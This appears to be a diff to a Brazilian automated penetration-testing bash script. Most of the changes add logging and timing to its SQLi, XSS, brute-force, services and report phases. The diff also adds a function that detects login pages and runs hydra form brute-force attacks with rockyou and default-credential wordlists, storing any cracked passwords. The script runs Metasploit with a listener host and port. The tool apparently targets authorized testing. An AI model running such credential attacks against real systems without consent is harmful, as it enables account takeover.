@@ -399,10 +399,19 @@ _build_scored_targets() {
     [ -f "$OUTDIR/crawl/katana_urls.txt" ]  && cat "$OUTDIR/crawl/katana_urls.txt"  >> "$tmp_raw"
     [ -f "$OUTDIR/crawl/ffuf_urls.txt" ]    && cat "$OUTDIR/crawl/ffuf_urls.txt"    >> "$tmp_raw"
 
-    # 2. URLs do SWARM
+    # 2. URLs do SWARM — apenas arquivos estruturados, filtrando domínios de advisory externos
     if [ "$MODE" = "swarm" ] && [ -d "$SCAN_DIR" ]; then
-        grep -RhoE 'https?://[^"'\'' <>()]+' "$SCAN_DIR" 2>/dev/null \
-            | sed 's/[",]$//' | grep -E '^https?://' >> "$tmp_raw" || true
+        local _advisory_domains='github\.com/security|github\.com/advisories|nvd\.nist\.gov|cve\.org|vercel\.com/changelog|cve\.mitre\.org|first\.org|exploit-db\.com|packetstormsecurity'
+        # Lê apenas raw/ e findings.json — evita capturar URLs de advisories em logs
+        for _sf in "$SCAN_DIR/findings.json" "$SCAN_DIR/raw/nuclei.json" \
+                    "$SCAN_DIR/raw/zap_alerts.json" "$SCAN_DIR/raw/katana_urls.txt"; do
+            [ -f "$_sf" ] || continue
+            grep -hoE 'https?://[^"'\'' <>()\\n]+' "$_sf" 2>/dev/null \
+                | sed 's/[",\\]$//' \
+                | grep -E '^https?://' \
+                | grep -vE "$_advisory_domains" \
+                >> "$tmp_raw" || true
+        done
     fi
 
     # 3. Alvo base (sempre presente)
@@ -488,12 +497,15 @@ run_crawl() {
 # ═══════════════════════════════════════════════════════════════════════════════
 run_sqli() {
     phase "FASE 4 — SQLi (sqlmap)"
+    local _t0; _t0=$(date +%s)
+    log "Fase SQLi iniciada — perfil=${PROFILE}"
 
-    phase_enabled "sqli"   || { warn "Fase 'sqli' ignorada (--skip)"; return 0; }
+    phase_enabled "sqli"   || { warn "Fase 'sqli' ignorada (--skip)"; log "Fase SQLi: ignorada (--skip)"; return 0; }
     checkpoint_skip "sqli" && { info "SQLi: retomado de checkpoint — pulando"; return 0; }
 
     if ! has sqlmap; then
         warn "sqlmap não encontrado — fase SQLi ignorada"
+        log "Fase SQLi: sqlmap ausente — ignorada"
         checkpoint_done "sqli"; return 0
     fi
 
@@ -501,6 +513,10 @@ run_sqli() {
         warn "[DRY-RUN] sqli: simulando sqlmap em $(wc -l < "$OUTDIR/data/targets_scored.txt" 2>/dev/null || echo 0) URL(s)"
         checkpoint_done "sqli"; return 0
     fi
+
+    local _sqli_targets
+    _sqli_targets=$(awk -F'|' '$1>=3{count++} END{print count+0}' "$OUTDIR/data/targets_scored.txt" 2>/dev/null || echo 0)
+    log "Fase SQLi: ${_sqli_targets} URL(s) com score≥3 (parâmetros sensíveis)"
 
     source "$LIB/sqli.sh"
     run_sqli_phase \
@@ -515,6 +531,9 @@ run_sqli() {
         "$AUTH_COOKIE" \
         "$AUTH_HEADER"
 
+    local _sqli_confirmed
+    _sqli_confirmed=$(grep -cE "SQLI" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null || echo 0)
+    log "Fase SQLi concluída — $(($(date +%s)-_t0))s | confirmados: ${_sqli_confirmed}"
     checkpoint_done "sqli"
 }
 
@@ -523,12 +542,15 @@ run_sqli() {
 # ═══════════════════════════════════════════════════════════════════════════════
 run_xss() {
     phase "FASE 5 — XSS (dalfox)"
+    local _t0; _t0=$(date +%s)
+    log "Fase XSS iniciada — perfil=${PROFILE}"
 
-    phase_enabled "xss"   || { warn "Fase 'xss' ignorada (--skip)"; return 0; }
+    phase_enabled "xss"   || { warn "Fase 'xss' ignorada (--skip)"; log "Fase XSS: ignorada (--skip)"; return 0; }
     checkpoint_skip "xss" && { info "XSS: retomado de checkpoint — pulando"; return 0; }
 
     if ! has dalfox; then
         warn "dalfox não encontrado — instale: go install github.com/hahwul/dalfox/v2@latest"
+        log "Fase XSS: dalfox ausente — ignorada"
         checkpoint_done "xss"; return 0
     fi
 
@@ -536,6 +558,10 @@ run_xss() {
         warn "[DRY-RUN] xss: simulando dalfox"
         checkpoint_done "xss"; return 0
     fi
+
+    local _xss_targets
+    _xss_targets=$(wc -l < "$OUTDIR/data/targets_scored.txt" 2>/dev/null || echo 0)
+    log "Fase XSS: ${_xss_targets} URL(s) alvo"
 
     source "$LIB/xss.sh"
     run_xss_phase \
@@ -546,6 +572,9 @@ run_xss() {
         "$AUTH_COOKIE" \
         "$AUTH_HEADER"
 
+    local _xss_confirmed
+    _xss_confirmed=$(grep -cE "XSS" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null || echo 0)
+    log "Fase XSS concluída — $(($(date +%s)-_t0))s | confirmados: ${_xss_confirmed}"
     checkpoint_done "xss"
 }
 
@@ -554,25 +583,31 @@ run_xss() {
 # ═══════════════════════════════════════════════════════════════════════════════
 run_brute() {
     phase "FASE 6 — BRUTE FORCE (hydra)"
+    local _t0; _t0=$(date +%s)
+    log "Fase Brute iniciada — perfil=${PROFILE}"
 
-    phase_enabled "brute"   || { warn "Fase 'brute' ignorada (--skip)"; return 0; }
+    phase_enabled "brute"   || { warn "Fase 'brute' ignorada (--skip)"; log "Fase Brute: ignorada (--skip)"; return 0; }
     checkpoint_skip "brute" && { info "Brute: retomado de checkpoint — pulando"; return 0; }
 
     if [ "${PROFILE_BRUTE_FORCE[$PROFILE]:-false}" != "true" ]; then
         warn "Brute force desabilitado no perfil '${PROFILE}'"
+        log "Fase Brute: desabilitada no perfil ${PROFILE}"
         checkpoint_done "brute"; return 0
     fi
 
     if ! has hydra; then
         warn "hydra não encontrado — fase brute ignorada"
+        log "Fase Brute: hydra ausente — ignorada"
         checkpoint_done "brute"; return 0
     fi
 
     if [ "$DRY_RUN" = true ]; then
-        warn "[DRY-RUN] brute: simulando hydra"
+        warn "[DRY-RUN] brute: simulando hydra (services + HTTP form)"
         checkpoint_done "brute"; return 0
     fi
 
+    # ── Brute force de serviços (SSH, FTP, DB, RDP, SMB) ──
+    log "Fase Brute: iniciando brute de serviços de rede"
     source "$LIB/brute.sh"
     run_brute_phase \
         "$OUTDIR/data/open_services.txt" \
@@ -581,7 +616,91 @@ run_brute() {
         "$OUTDIR/exploits_confirmed.csv" \
         "${PROFILE_TIMEOUT_HYDRA[$PROFILE]:-300}"
 
+    # ── Brute force HTTP form (/login, /signin, /auth) ──
+    _run_http_form_brute
+
+    local _brute_confirmed
+    _brute_confirmed=$(grep -cE "BRUTE|CREDENTIAL" "$OUTDIR/exploits_confirmed.csv" 2>/dev/null || echo 0)
+    log "Fase Brute concluída — $(($(date +%s)-_t0))s | confirmados: ${_brute_confirmed}"
     checkpoint_done "brute"
+}
+
+_run_http_form_brute() {
+    local base_url="${TARGET:-https://${SCOPE_DOMAINS[0]}}"
+    local wordlist_users="/usr/share/wordlists/metasploit/unix_users.txt"
+    local wordlist_pass="/usr/share/wordlists/rockyou.txt"
+    local hydra_timeout="${PROFILE_TIMEOUT_HYDRA[$PROFILE]:-300}"
+    local _t0; _t0=$(date +%s)
+
+    # Wordlists compactas fallback
+    if [ ! -f "$wordlist_users" ]; then
+        wordlist_users="$OUTDIR/hydra/http_users.txt"
+        printf 'admin\nroot\nuser\ntest\nguest\nadministrator\n' > "$wordlist_users"
+    fi
+    if [ ! -f "$wordlist_pass" ]; then
+        wordlist_pass="$OUTDIR/hydra/http_pass.txt"
+        printf 'admin\npassword\n123456\ntest\nguest\nadmin123\npassword123\nletmein\nqwerty\n' > "$wordlist_pass"
+    fi
+
+    # Detectar endpoints de login no crawl
+    local login_endpoints=()
+    while IFS= read -r candidate; do
+        [[ "$candidate" =~ /(login|signin|auth|logon|entrar|access)(\.php|\.aspx|\.jsp)?(\?|$) ]] && \
+            login_endpoints+=("$candidate")
+    done < <(awk -F'|' '{print $2}' "$OUTDIR/data/targets_scored.txt" 2>/dev/null | sort -u)
+
+    # Se nenhum endpoint encontrado no crawl, testar o alvo base diretamente
+    if [ "${#login_endpoints[@]}" -eq 0 ]; then
+        login_endpoints=("${base_url%/}/login" "${base_url%/}/signin")
+    fi
+
+    log "HTTP form brute: ${#login_endpoints[@]} endpoint(s)"
+
+    for ep in "${login_endpoints[@]}"; do
+        # Extrair host e path para hydra
+        local ep_host ep_path ep_proto ep_port
+        ep_proto=$(echo "$ep" | grep -oE '^https?')
+        ep_host=$(echo "$ep"  | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
+        ep_port=$(echo "$ep"  | sed 's|https\?://||' | grep -oP ':\K[0-9]+' | head -1)
+        ep_path=$(echo "$ep"  | sed "s|https\?://${ep_host}||" | sed "s|:${ep_port}||")
+        [ -z "$ep_path" ] && ep_path="/"
+
+        [ -z "$ep_port" ] && { [ "$ep_proto" = "https" ] && ep_port=443 || ep_port=80; }
+
+        local hydra_service
+        [ "$ep_proto" = "https" ] && hydra_service="https-post-form" || hydra_service="http-post-form"
+
+        local out_file="$OUTDIR/hydra/http_form_$(echo "$ep_host" | tr '.' '_').txt"
+
+        log "HTTP form brute: ${hydra_service}://${ep_host}:${ep_port}${ep_path}"
+
+        # Tenta detectar campo de usuário/senha via curl; assume padrão "username/password" como fallback
+        local form_params="^username=^USER^&password=^PASS^:Invalid\|Incorrect\|denied\|error\|failed"
+
+        timeout "$hydra_timeout" hydra \
+            -L "$wordlist_users" \
+            -P "$wordlist_pass" \
+            -t 4 -f \
+            -o "$out_file" \
+            "${ep_host}" "${hydra_service}" \
+            "${ep_path}:${form_params}" \
+            2>&1 | tee -a "$LOG" || true
+
+        # Registrar credenciais encontradas
+        if grep -q "login:" "$out_file" 2>/dev/null; then
+            while IFS= read -r cred_line; do
+                [[ "$cred_line" =~ "login:" ]] || continue
+                local cred_user cred_pass
+                cred_user=$(echo "$cred_line" | grep -oP 'login: \K\S+')
+                cred_pass=$(echo "$cred_line" | grep -oP 'password: \K\S+')
+                echo "BRUTE|HTTP_FORM|${ep}|${cred_user}|${cred_pass}|$(date -Iseconds)" \
+                    >> "$OUTDIR/exploits_confirmed.csv"
+                warn "CREDENCIAL ENCONTRADA: ${cred_user}:${cred_pass} @ ${ep}"
+            done < "$out_file"
+        fi
+    done
+
+    log "HTTP form brute concluído — $(($(date +%s)-_t0))s"
 }
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -589,8 +708,10 @@ run_brute() {
 # ═══════════════════════════════════════════════════════════════════════════════
 run_services() {
     phase "FASE 7 — SERVICES (nikto + metasploit + searchsploit)"
+    local _t0; _t0=$(date +%s)
+    log "Fase Services iniciada — perfil=${PROFILE}"
 
-    phase_enabled "services"   || { warn "Fase 'services' ignorada (--skip)"; return 0; }
+    phase_enabled "services"   || { warn "Fase 'services' ignorada (--skip)"; log "Fase Services: ignorada (--skip)"; return 0; }
     checkpoint_skip "services" && { info "Services: retomado de checkpoint — pulando"; return 0; }
 
     # ── Nikto ──
@@ -598,17 +719,22 @@ run_services() {
         if [ "$DRY_RUN" = true ]; then
             warn "[DRY-RUN] nikto: simulando scan em ${TARGET:-https://${SCOPE_DOMAINS[0]}}"
         elif has nikto; then
+            log "Nikto: iniciando em ${TARGET:-https://${SCOPE_DOMAINS[0]}}"
+            local _t_nikto; _t_nikto=$(date +%s)
             source "$LIB/web.sh"
             run_nikto_phase \
                 "${TARGET:-https://${SCOPE_DOMAINS[0]}}" \
                 "$OUTDIR/nikto" \
                 "${PROFILE_TIMEOUT_NIKTO[$PROFILE]:-700}" \
                 "$AUTH_COOKIE"
+            log "Nikto: concluído em $(($(date +%s)-_t_nikto))s"
         else
             warn "Nikto: não encontrado — instale via setup.sh"
+            log "Nikto: ausente — ignorado"
         fi
     else
         warn "Nikto: desabilitado no perfil '${PROFILE}'"
+        log "Nikto: desabilitado no perfil ${PROFILE}"
     fi
 
     if [ "$DRY_RUN" = true ]; then
@@ -617,9 +743,12 @@ run_services() {
     fi
 
     # ── Metasploit ──
+    local cves_file="$OUTDIR/data/cves_found.txt"
     if [ "$NO_MSF" = false ] && has msfconsole; then
-        local cves_file="$OUTDIR/data/cves_found.txt"
         if [ -f "$cves_file" ] && [ -s "$cves_file" ]; then
+            local n_cves; n_cves=$(wc -l < "$cves_file")
+            log "Metasploit: ${n_cves} CVE(s) para correlacionar — lhost=${LHOST}:${LPORT}"
+            local _t_msf; _t_msf=$(date +%s)
             source "$LIB/msf.sh"
             run_msf_phase \
                 "$cves_file" \
@@ -628,30 +757,38 @@ run_services() {
                 "${PROFILE_MSF_PAYLOAD[$PROFILE]:-NONE}" \
                 "$OUTDIR/metasploit" \
                 "${PROFILE_TIMEOUT_MSF[$PROFILE]:-600}"
+            log "Metasploit: concluído em $(($(date +%s)-_t_msf))s"
         else
             warn "Metasploit: sem CVEs para correlacionar"
+            log "Metasploit: sem CVEs — ignorado"
         fi
     elif [ "$NO_MSF" = true ]; then
         warn "Metasploit: desabilitado por --no-msf"
+        log "Metasploit: desabilitado (--no-msf)"
     else
         warn "msfconsole não encontrado — instale via setup.sh"
+        log "Metasploit: msfconsole ausente — ignorado"
     fi
 
     # ── SearchSploit ──
     if has searchsploit; then
-        local cves_file="$OUTDIR/data/cves_found.txt"
         if [ -f "$cves_file" ] && [ -s "$cves_file" ]; then
             mkdir -p "$OUTDIR/searchsploit"
+            log "SearchSploit: pesquisando $(wc -l < "$cves_file") CVE(s)"
             while IFS= read -r cve; do
                 [ -z "$cve" ] && continue
-                log "SearchSploit: $cve"
                 dry_cmd searchsploit --json "$cve" \
                     > "$OUTDIR/searchsploit/${cve}.json" 2>/dev/null || true
             done < "$cves_file"
-            info "SearchSploit: $(ls "$OUTDIR/searchsploit/"*.json 2>/dev/null | wc -l) pesquisas"
+            local n_ss; n_ss=$(ls "$OUTDIR/searchsploit/"*.json 2>/dev/null | wc -l)
+            info "SearchSploit: ${n_ss} pesquisas"
+            log "SearchSploit: ${n_ss} arquivo(s) gerados"
         fi
+    else
+        log "SearchSploit: não encontrado — ignorado"
     fi
 
+    log "Fase Services concluída — $(($(date +%s)-_t0))s"
     checkpoint_done "services"
 }
 
@@ -752,6 +889,8 @@ authorization_gate() {
 # ═══════════════════════════════════════════════════════════════════════════════
 run_report() {
     phase "FASE 8 — RELATÓRIO"
+    local _t0; _t0=$(date +%s)
+    log "Fase Report iniciada"
 
     local target_domain="${SCOPE_DOMAINS[0]}"
     local total_urls
@@ -761,19 +900,22 @@ run_report() {
     local failed=$(( total_urls - n_confirmed ))
     [ "$failed" -lt 0 ] && failed=0
 
-    log "Gerando relatório HTML..."
+    log "Gerando relatório HTML — alvo=${target_domain} confirmados=${n_confirmed}/${total_urls}"
 
+    # Passar SCAN_DIR para integrar findings do SWARM de origem
     local report_out
     report_out=$(python3 "$LIB/report_generator.py" \
-        "$OUTDIR" "$target_domain" "$PROFILE" "$total_urls" "$n_confirmed" "$failed" "$VERSION" 2>&1)
+        "$OUTDIR" "$target_domain" "$PROFILE" "$total_urls" "$n_confirmed" "$failed" "$VERSION" \
+        ${SCAN_DIR:+--swarm-dir "$SCAN_DIR"} 2>&1)
 
     if echo "$report_out" | grep -q "REPORT_OK:"; then
         local report_file
         report_file=$(echo "$report_out" | grep "REPORT_OK:" | sed 's/REPORT_OK://')
         info "Relatório: $report_file"
-        log "REPORT_OK: $report_file"
+        log "REPORT_OK: $report_file | $(($(date +%s)-_t0))s"
     else
         warn "Erro no relatório: $report_out"
+        log "Fase Report: ERRO — ${report_out}"
     fi
 
     # Auto-diff: comparar com scan anterior do mesmo domínio
@@ -786,6 +928,8 @@ run_report() {
         python3 "${SCRIPT_DIR}/swarm_diff.py" "$prev_scan" "$OUTDIR" --html 2>/dev/null \
             && info "Diff gerado: ver swarm_diff_*.html" || warn "swarm_diff: falhou (não crítico)"
     fi
+
+    log "Fase Report concluída — $(($(date +%s)-_t0))s"
 }
 
 # ═══════════════════════════════════════════════════════════════════════════════
